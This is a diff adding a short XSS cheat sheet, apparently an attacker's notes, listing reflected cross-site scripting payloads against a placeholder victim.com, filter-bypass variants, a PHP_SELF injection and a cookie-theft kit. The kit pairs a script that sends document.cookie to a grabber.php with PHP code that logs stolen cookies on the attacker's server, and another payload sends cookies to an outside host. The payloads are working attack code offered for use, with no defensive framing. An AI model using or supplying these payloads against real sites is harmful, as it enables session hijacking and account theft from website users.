@@ -1,0 +1,49 @@
+xss examples:
+
+http://victim.com/index.php?id=1<script>alert('hahahah')</script>
+
+To bypass filtering play around with the capitalization:
+
+http://victim.com/index.php?id=1<scRipt>alert('hahahah')</scRipt>
+
+Other ways to execute xss:
+
+http://victim.com/index.php?id=1<img src='xx:xx' onerror=alert(1)>
+http://victim.com/index.php?id=1<scri<script>pt>alert('xss')</scri</script>pt>
+
+Always look at the html code and apply similiar techniques a sql injection by terminating the string:
+
+http://victim.com/index.php?id=id"; alert('hah')//
+
+You can use different xss payloads to trigger the promot besides using alert() or confirm() func:
+
+refer to http://www.smeegesec.com/2012/06/collection-of-cross-site-scripting-xss.html
+
+
+XSS script to steal cookie:
+
+<?php
+// How to use it
+# <script>document.location='http://localhost/XSS/grabber.php?c=' + document.cookie</script>
+# Paste the above script in the vuln website and execute
+# Save the bottom script on your vps as grabber.php
+
+// Write the cookie in a file
+$cookie = $_GET['c'];
+$fp = fopen('cookies.txt', 'a+');
+fwrite($fp, 'Cookie:' .$cookie.'\r\n');
+fclose($fp);
+
+?>
+
+
+Another cookie stealing xss eg:
+http://victim.com/index.php?id=haha<script>document.write('<img src="http://goose.r00tpgp.com?c='%2bdocument.cookie%2b'">')</script>
+
+
+If victim site uses PHP_SELF, here's an eg for xss:
+
+http://victim.com/index.php/"><script>alert('hahah')</script>
+
+
+
